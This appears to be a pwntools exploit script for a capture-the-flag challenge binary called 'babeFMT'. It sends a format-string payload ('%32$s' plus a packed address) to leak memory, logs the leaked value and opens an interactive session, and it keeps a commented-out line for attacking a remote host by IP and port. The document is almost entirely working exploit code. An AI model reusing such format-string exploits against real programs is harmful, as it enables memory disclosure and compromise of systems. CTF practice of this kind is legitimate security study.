from pwn import *

io = process("./babeFMT")

#io = remote("34.126.117.181",2222)

io.sendlineafter(" What your name? : \n","A A A")
gdb.attach(io)

payload = "%32$saaa" + p32(0x804c01c)

io.send(payload)

leak = u32(io.recv(4))
log.info("leak @ "+str(hex(leak)))

io.interactive()
